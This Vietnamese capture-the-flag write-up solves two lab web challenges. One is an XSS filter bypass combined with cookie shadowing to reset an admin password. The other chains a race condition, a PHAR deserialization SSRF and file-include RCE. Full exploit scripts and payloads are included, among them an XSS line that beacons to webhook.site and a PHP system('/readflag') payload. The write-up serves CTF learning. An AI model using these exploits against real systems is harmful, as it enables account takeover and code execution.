## 1. ChatGPT Made Me Do It
Nhìn vào dockerfile và docker-compose thì khả năng là 1 bài XSS vì thấy có tải `chromium`.
Nhận thấy XSS xảy ra ở username khi đăng kí tài khoản.Có một bộ lọc yếu để chặn XSS.
```javascript
function santi(str) {
  const tag = str.match(/<([^>]*)>/); // .match chỉ kiếm tra match 1 lần , vì không dùng cờ g

  if (tag && /[a-zA-Z]/.test(tag[1])) {
    return 'no hack';
  }

  return str;
}
```
bộ lọc lấy match trong cặp`<>` chỉ 1 lần (thiếu cờ g).
bypass: `<!---><script>alert(1)</script>`
![image](https://hackmd.io/_uploads/H1BFMpVKfg.png)
XSS dính ở endpoint `/immortal-gate/check`

```javascript
router.all('/immortal-gate/check', (req, res) => {
  const name = req.query.name || req.session.username || '';
  res.write(`${santi(decodeURIComponent(String(name)))}, hello`);
  res.end();
});

```

function gửi url cho bot:

```javascript
router.all('/immortal-gate/report', (req, res) => {
  const username = req.session.username;

  if (username === undefined) return res.redirect('/immortal-gate/sign-in');

  if (req.method === 'GET') return res.send(renderReport());

  const url = req.body.url || '';
  if (!url.startsWith('http://') && !url.startsWith('https://')) {
    return res.send(alertBack('❌ Liên kết định dạng sai, phải bắt đầu bằng http:// hoặc https://!'));
  }

  visitUrl(url).catch((error) => {
    console.error(`Error occurred: ${error && error.stack ? error.stack : error}`);
  });
```

ở app.js hoặc nhìn cấu hình ở trình duyệt có cấu hình `httpOnly` nên không đọc được cookies. Nhưng cứ tạo request ra webhook để check trước đã. 
![image](https://hackmd.io/_uploads/HyexYETEYzx.png)
![image](https://hackmd.io/_uploads/r182E6EFzl.png)

`res.write()` đơn giải chỉ trả về 1 văn bản (text) không xét content-type nên cần sử dụng signature của file html để trình duyệt tự nhận diện


thêm đoạn code sau để chek rõ log:
```
await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 5000 });
	// check url
    const currentUrl = page.url();
    console.log("--- URL THỰC TẾ TRANG ĐANG TRUY CẬP ---");
    console.log(currentUrl);
    
    // check response 
    
    const pageContent = await page.content();
    
    console.log("--- NỘI DUNG HTML TRẢ VỀ TỪ URL ---");
    console.log(pageContent);
    // [THÊM ĐOẠN NÀY] Kiểm tra cách trình duyệt đánh giá nội dung
    const evaluationResult = await page.evaluate(() => {
      const docType = document.contentType; // Kiểu MIME mà trình duyệt thực tế đang gán cho trang
      const hasHtmlStructure = document.querySelector('html') !== null; // Kiểm tra xem có nhận diện ra thẻ html hay không
      const firstChildTag = document.body ? document.body.firstElementChild?.tagName : null;

      return {
        browserContentType: docType,
        hasHtmlTag: hasHtmlStructure,
        firstTag: firstChildTag,
        pageTextLength: document.body ? document.body.innerText.length : 0
      };
    });
    
    console.log("--- ĐÁNH GIÁ CỦA TRÌNH DUYỆT ---");
    console.log(evaluationResult);
```
payload: `http://localhost:3000/immortal-gate/check?name=<!---><script>new Image().src = "https://webhook.site/61b6dfc5-fe15-4492-8437-e04e7d5b367a/?msg=qdz";</script>`
![image](https://hackmd.io/_uploads/ryXefA4Kzx.png)
![image](https://hackmd.io/_uploads/H1cbfREtMe.png)


nhận thấy thành công nhưng mà `httpOnly` không đọc được nên cần check function khác: reset password. 
[Cookie Shadowing](https://kalawy.medium.com/cookie-shadowing-and-csp-bypass-to-read-httponly-cookie-way-too-easy-conctf-finals-0de7dda28ee6)

```javascript
router.all('/cultivation/password', (req, res) => {
  const username = req.session?.username;
  const csrfToken = req.cookies.csrf_token;

  if (username === undefined) {
    return res.redirect('/immortal-gate/sign-in');
  } 

  if (req.headers['x-csrf-token'] !== csrfToken) {
    return res.send(alertBack('❌ Tâm ma tác sai, công kích bị ngăn chặn!'));
  }

  const newPassword = req.body.new_password || '';
  users.set(username, newPassword);

  return res.send(alertBack('✨ Công pháp tu sửa thành công!'));
});
```

Từ trình duyệt admin ---> reset passowrd nhưng cần `x-csrf-token'] == csrfToken`

```
Same-name Cookies ordering
When the browser encounters multiple cookies with the same name destined for the same endpoint, how will it order those cookies in the Cookie? Will it send the early created first?
Actually, RFC 6265 §5.4 states that ordering goes as follows:

1. The cookie with the longest path comes first.
2. If two cookies have the same path length, the earliest created one comes first.
```

Theo như câu nói trên thì nếu same-name cookies thì nó ưu tiên path dài hơn . ----> từ XSS tạo 1 cookies name trùng với path khác nhau.
Cấu hình `middleware`
```javascript
const { alertBack } = require('./utils');
const { BASE_URL } = require('./config');

function csrfProtection(req, res, next) {
  const secFetchSite = req.get('Sec-Fetch-Site');
  const secFetchUser = req.get('Sec-Fetch-User');
  const method = req.method;

  if (method === 'GET') {
    return next();
  }

  if (secFetchSite !== undefined && secFetchUser !== '?1') {
    return res.send(alertBack('no hack'));
  }

  return next();

}

module.exports = {
  csrfProtection,
};

```

nếu method là Get thì sẽ không dính , `ecFetchUser` sẽ không được tự động tạo bởi các request bởi `fetch()` , `new Image().src` ,....

**script:**
```javascript
<!---><script>
void (async () => {
   document.cookie = 'csrf_token=quandz; path=/cultivation/password; SameSite=Strict';
   await fetch('/cultivation/password', {
    method: 'GET',
    headers: {
      'x-csrf-token': 'quandz'
    },
    credentials: 'include' 
  });
})();

</script>
```
sử dụng url này : 
```
http://localhost:3000/immortal-gate/check?name=<!---><script>
void(async()=>{document.cookie='csrf_token=quandz; path=/cultivation/password; SameSite=Strict';await fetch('/cultivation/password',{method:'GET',headers:{'x-csrf-token':'quandz'},credentials:'include'});})();
</script>
```
để thay đổi password của admin thành rỗng rồi login lấy flag `username=admin&password=` sau đó truy cập `/immortal-gate/treasure` bằng POST method để lấy flag



![image](https://hackmd.io/_uploads/HJz_hyStfe.png)

Script tự động:
```bash
#!/usr/bin/env python3
import http.cookiejar, random, re, string, sys, time, urllib.parse, urllib.request

HOST = (sys.argv[1] if len(sys.argv) > 1 else "<http://localhost:3000>").rstrip("/")
BOT = "<http://localhost:3000>"
XSS = """<!--><script>void(async()=>{document.cookie='csrf_token=knowncsrf; path=/cultivation/password; SameSite=Strict';await fetch('/cultivation/password',{method:'GET',headers:{'x-csrf-token':'knowncsrf'},credentials:'include'})})();</script>"""
PAY = BOT + "/immortal-gate/check?name=" + urllib.parse.quote(XSS, safe="")
FLAG = re.compile(r"\w+\{[^}]+\}")

def sess():
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))

def req(op, path, data=None):
    if isinstance(data, dict):
        data = urllib.parse.urlencode(data).encode()
    return op.open(urllib.request.Request(HOST + path, data=data, method="GET" if data is None else "POST"), timeout=10).read().decode(errors="replace")

s = "".join(random.choices(string.digits, k=10))
u, p = "u" + s, "p" + s
a = sess()
req(a, "/immortal-gate/sign-up", {"username": u, "password": p})
req(a, "/immortal-gate/sign-in", {"username": u, "password": p})
req(a, "/immortal-gate/report", {"url": PAY})
time.sleep(3)
a = sess()
req(a, "/immortal-gate/sign-in", {"username": "admin", "password": ""})
print(FLAG.search(req(a, "/immortal-gate/treasure", b"")).group())

```

## 2. 367
![image](https://hackmd.io/_uploads/ryaRaiSFMx.png)
Theo như phân tích của sheet này thì có 1 hướng đánh là:
- 1. RCE thông qua `include ($filename)` ----> chạy `/readflag`
    - yêu cầu: 
        - cần role superadmin
        - cần filename nằm trong `/tmp`
        - nội dung file là php hợp lệ
    
- 2. Ở `delete.php` có dính `Phar serialize` normal user có thể trigger. Tận dụng `PendingPreview` để SSRF bằng cách thông qua `__destruct` gọi `$this->state->flush()`
- 3. Để có lên được `supperadmin` khi `(md5($input_code) === $admin_token && $_SERVER['REMOTE_ADDR'] === '127.0.0.1')` trả về `true`
- 4. `admin` có thể copy file vào `/tmp`

Vấn đề bây  giờ làm sao trở thành admin?? Chỉ có tính năng ở `autologin.php`

`autologin.php`
```php
// xử lý link login nhanh
if (isset($_GET['vault_key'])) {
    $vault_key = mock_sanitize_input($_GET['vault_key']);
    $needle = '%' . mock_esc_like(mock_wp_json_encode($vault_key)) . '%';
    $stmt = $conn->prepare("SELECT user_id FROM user_meta WHERE meta_key = 'vault_autologin_record' AND meta_value LIKE ? ESCAPE '\\\\'");
    $stmt->bind_param('s', $needle);
    $stmt->execute();
    $result = $stmt->get_result();
    $user_ids = [];
    while ($row = $result->fetch_assoc()) {
        $user_ids[] = (int)$row['user_id'];
    }
    $stmt->close();


// tạo link truy cập nhanh bị controll bởi username
if ($action === 'create_by_username') {
        $username = trim($_POST['username'] ?? '');
        $expires_on = $_POST['expires_on'] ?? date('Y-m-d', strtotime('+30 days')); // control bởi user
        $unlimited_use = !empty($_POST['unlimited_use']) ? 'checked' : '';

        if ($username === '') {
            $notice = 'Username is required.';
        } else {
            $user_stmt = $conn->prepare("SELECT id FROM users WHERE username = ? LIMIT 1");
            $user_stmt->bind_param('s', $username);
            $user_stmt->execute();
            $user_result = $user_stmt->get_result();
            $user = $user_result->fetch_assoc();
            $user_stmt->close();

            if ($user) { // lấy user by u
                $code = bin2hex(random_bytes(16));
                $record = [
                    'status' => 'active',
                    'email_list' => '',
                    'token' => $code,
                    'expiry_mode' => 'unchecked',
                    'expires_on' => $expires_on,
                    'unlimited_use' => $unlimited_use ? 'checked' : '',
                ];
                $serialized = serialize($record);
                $stmt = $conn->prepare("INSERT INTO user_meta (user_id, meta_key, meta_value) VALUES (?, 'vault_autologin_record', ?) ON DUPLICATE KEY UPDATE meta_value = VALUES(meta_value)");
                $stmt->bind_param('is', $user['id'], $serialized);
                if ($stmt->execute()) {
                    if ($user['id'] === (int)$_SESSION['user_id']) {
                        $generated_link = '/autologin.php?vault_key=' . urlencode($code);
                        $notice = 'Auto-login link generated for your username.';
                    } else {
                        $cleanup = $conn->prepare("DELETE FROM user_meta WHERE user_id = ? AND meta_key = 'vault_autologin_record'");
                        $cleanup->bind_param('i', $user['id']);
                        $cleanup->execute();
                        $cleanup->close();
                        $generated_link = '';
                        $notice = 'Username does not match your account.';
               ``     }
                } else {
                    $notice = 'Failed to create auto-login link.';
                }
                $stmt->close();
            } else {
                $notice = 'User not found.';
            }
        }
    }
```
- ở tính năng xử lý link truy cập nhanh sử dụng `LIKE` để tìm kiếm` vault_key` là phạm vi quá rộng ---> lập trình không an toàn
- quy trình tạo link truy cập nhanh : 
    1. tạo link dựa trên username (bị controll) lưu vào `user_meta` table
    2. kiểm tra `session_id` và `user_id` nêu trùng thì lưu ở db còn không trùng thì xóa
- Race condition xảy ra ở đây , tài nguyên tranh chấp là giá trị của `link truy cập nhanh` lưu trong db:
```
POST /autologin.php (create_by_username)          GET /autologin.php?vault_key=MARKER
------------------------------------------        --------------------------------------

t0  INSERT row admin
    ┌─────────────────────────────┐
    │ ROW ADMIN TỒN TẠI           │  <-- tài nguyên bắt đầu tồn tại
    └─────────────────────────────┘
                                                   t0.5  SELECT ... LIKE '%MARKER%'
                                                         -> tìm thấy row admin

t1  CHECK: user_id == session_user_id?
    -> false (không phải chính mình)
                                                   t1.5  SET SESSION admin
                                                         -> login thành admin

t2  DELETE row admin
    ┌─────────────────────────────┐
    │ ROW ADMIN BỊ XÓA            │  <-- tài nguyên biến mất
    └─────────────────────────────┘

```

vì chuối `vault_key` là giá trị của `$code` được tạo random và được lưu vào cột  `meta_value` của `user_meta`
 table . Mà giá trị của cột  `meta_value` lại được tạo từ :
```php
$record = [
                    'status' => 'active',
                    'email_list' => '',
                    'token' => $code,
                    'expiry_mode' => 'unchecked',
                    'expires_on' => $expires_on,
                    'unlimited_use' => $unlimited_use ? 'checked' : '',
                ];
$serialized = serialize($record);
```
Kết hợp với toàn tử `LIKE` ở trên thì vấn có thể truy cập được record của user `admin` nếu trên database có record.

Ý tưởng:
- tạo 1 request tạo link truy cập nhanh với user admin có cấu hình `expires_on` 
- 1 request truy cập link với `vault_key=expires_on` 

Script race condition
```python

import requests
import threading
import secrets
import sys

HOST = "http://localhost:8081"
USER_COOKIES = {"PHPSESSID": "f621cf465516e4da0fabf2245625c0dd"}
MARKER = "m" + secrets.token_hex(16)

stop = threading.Event()
winner = None
lock = threading.Lock()

def create_autologin():
    while not stop.is_set():
        try:
            requests.post(
                f"{HOST}/autologin.php",
                cookies=USER_COOKIES,
                data={
                    "action": "create_by_username",
                    "username": "admin",
                    "expires_on": MARKER,
                    "unlimited_use": "on",
                },
                allow_redirects=False,
                timeout=3,
            )
        except requests.RequestException:
            pass

def auto_login():
    global winner
    while not stop.is_set():
        try:
            r = requests.get(
                f"{HOST}/autologin.php?vault_key={MARKER}",
                allow_redirects=False,
                timeout=3,
            )
            if r.status_code == 302 and r.headers.get("Location") == "/index.php":
                with lock:
                    if winner is None:
                        winner = r.cookies.get_dict()
                        print("[+] hit:", winner)
                        stop.set()
                        return
        except requests.RequestException:
            pass

def main():
    print("[*] Target:", HOST)
    print("[*] Marker:", MARKER)

    threads = []

    for _ in range(20):
        threads.append(threading.Thread(target=create_autologin, daemon=True))

    for _ in range(50):
        threads.append(threading.Thread(target=auto_login, daemon=True))

    for t in threads:
        t.start()

    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        stop.set()

    if winner:
        print("[+] SUCCESS")
        print("[+] Cookie admin:", winner)
    else:
        print("[-] No hit. Tăng thread hoặc chạy lại.")
        sys.exit(1)

if __name__ == "__main__":
    main()
```

![image](https://hackmd.io/_uploads/Hy3OvOLKGe.png)

`admin ----> supperadmin` cần `$admin_token` và `$_SERVER['REMOTE_ADDR'] === '127.0.0.1'` mà `$admin_token` lấy từ `header('X-Archive-Receipt: ' . $bridge_receipt);` của `dashboard.php`

Tận dụng Object trong `delete.php` để SSRF
![image](https://hackmd.io/_uploads/SJvmSt8Yfx.png)
![image](https://hackmd.io/_uploads/BybSrF8FGl.png)

`X-Archive-Receipt: QVJDSElWRS1BRDQxQjAxOEYxRDY1OEE5`

**Script tạo file phar**
```php
<?php
/**
 * build_phar.php
 *
 * Tạo file PHAR chứa metadata là object gadget chain.
 * Chạy: php -d phar.readonly=0 build_phar.php
 */

// ============================================================
// [1] GADGET CHAIN CLASSES
//     Phải khai báo ĐÚNG tên + visibility như trên target,
//     nếu không unserialize sẽ fail khi đọc PHAR.
// ============================================================

class PreviewState {
    public $endpoint;
    private $headers;
    private $payload;
    private $sessionNote;

    public function __construct(string $endpoint, string $payload = '', string $sessionNote = '', array $headers = []) {
        $this->endpoint    = $endpoint;
        $this->payload     = $payload;
        $this->sessionNote = $sessionNote;
        $this->headers     = $headers;
    }
}

class PendingPreview {
    public $state;

    public function __construct(PreviewState $state) {
        $this->state = $state;
    }
}

// ============================================================
// [2] CUSTOM — SỬA PHẦN NÀY
//     Đây là chỗ bạn nhét payload thật.
// ============================================================

// Tham số cho request SSRF
$endpoint   = 'http://127.0.0.1/admin.php';   // URL curl sẽ gọi tới
$token      = 'ARCHIVE-51E2F8950A1673BA';     // access_code
$sessionId  = 'a811fc7c7c217f2ba5207c5869cf3b8f'; // PHPSESSID của admin

// POST body
$body = http_build_query(['access_code' => $token]);

// Cookie
$cookie = 'PHPSESSID=' . $sessionId;

// Header bổ sung (để rỗng nếu không cần)
// Nếu cần gửi header, dùng int trực tiếp để tránh lỗi thiếu curl extension:
//   10002 = CURLOPT_HTTPHEADER
// Ví dụ:
//   $headers = [10002 => ['X-Archive-Receipt: ' . $token]];
$headers = [];

// Build gadget chain
$gadget = new PendingPreview(
    new PreviewState($endpoint, $body, $cookie, $headers)
);

// ============================================================
// [3] PHAR CONFIG — có thể sửa nếu cần
// ============================================================

$outputPath = __DIR__ . '/out.jpg';        // file cuối cùng (đổi đuôi .jpg/.png)
$tempPhar   = __DIR__ . '/.tmp_build.phar'; // file PHAR tạm (native)

// Prefix magic bytes để ngụy trang (tùy chọn).
// - Để rỗng nếu không cần:      ''
// - JPEG:                        "\xff\xd8\xff\xe0"
// - PNG:                         "\x89PNG\r\n\x1a\n"
// - GIF:                         "GIF89a"
$stubPrefix = '';

// Tên entry bên trong PHAR (bắt buộc PHAR phải có ít nhất 1 entry)
// Đặt .jpg để pathinfo() trên target trả về "jpg" → qua check extension.
$innerName    = 'x.jpg';
$innerContent = 'x';

// ============================================================
// [4] BUILD PHAR
// ============================================================

if (PHP_SAPI !== 'cli') {
    fwrite(STDERR, "Run from CLI.\n");
    exit(1);
}

if (filter_var(ini_get('phar.readonly'), FILTER_VALIDATE_BOOLEAN)) {
    fwrite(STDERR, "phar.readonly is ON. Run with: php -d phar.readonly=0 build_phar.php\n");
    exit(1);
}

@unlink($tempPhar);
@unlink($outputPath);

$phar = new Phar($tempPhar);
$phar->startBuffering();

$phar->addFromString($innerName, $innerContent);
$phar->setStub($stubPrefix . "<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($gadget);

$phar->stopBuffering();
unset($phar);   // QUAN TRỌNG: đóng handle trước khi copy

copy($tempPhar, $outputPath);
@unlink($tempPhar);

// ============================================================
// [5] DEBUG
// ============================================================

echo "=== Serialized metadata ===\n";
echo str_replace("\0", '\\0', serialize($gadget)) . "\n\n";

echo "=== Output ===\n";
echo "File:   $outputPath\n";
echo "Size:   " . filesize($outputPath) . " bytes\n";

echo "\n=== Verify ===\n";
echo "Run these to check:\n";
echo "  file $outputPath\n";
echo "  php -r 'var_dump(file_get_contents(\"phar://$outputPath/$innerName\"));'\n";
echo "  php -r 'var_dump((new Phar(\"$outputPath\"))->getMetadata());'\n";

echo "\nUpload $outputPath then trigger delete.php with:\n";
echo "  title=phar:///absolute/path/to/uploads/" . basename($outputPath) . "/$innerName\n";

```

upoad và xóa file để trigger deserialize
`title=phar:///tmp/f22c57f40902af1e/ld93xz7a5Yk5u.jpg/x.jpg`
![image](https://hackmd.io/_uploads/HJ9eBALFzl.png)

Sau khi lên được supperadmin nghĩ là xong rồi như code có lower file name nên không thể gọi.
```php
if (!empty($_SESSION['admin'])) {
    if ($bridge_receipt !== '') {
        header('X-Archive-Receipt: ' . $bridge_receipt);
    }

    if ($_POST['filename']) {
        include "./templates/dashboard.html";
        if (!empty($_SESSION['superadmin'])) {
            $filename = strtolower(trim($_POST['filename']));
            if (strpos($filename, '/tmp') !== 0 || strpos($filename, '../') !== false) {
                echo "<div class='center-text'>Only /tmp paths are allowed.</div>";
            } else if (!file_exists($filename)) {
                echo "<div class='center-text'>File not found.</div>";
            } else {
                include ($filename);
            }
        } else {
            echo "<div class='center-text'>Superadmin access required.</div>";
        }
    }
    else {
        include "./templates/dashboard.html";
    }
}
```
**giải pháp:**
![image](https://hackmd.io/_uploads/SJHi50UYGe.png)
cấu hình webbook với `Set-Cookie: X=<?php system('/readflag'); ?>`

truy cập [requex](https://requex.me/hook/c2e89953-f828-4d4a-9cb3-e895f28183bf) cấu hình như sau:

![image](https://hackmd.io/_uploads/BkJDYyvtzx.png)
thực hiện tương tự như trên upload --> delete ---> đọc file qua `dashboard.php` để trigger RCE.


 `FLAG: KMACTF{SQLinjection_1s_GOAT_96c9885e9b9ffd834c64855aa447175e}`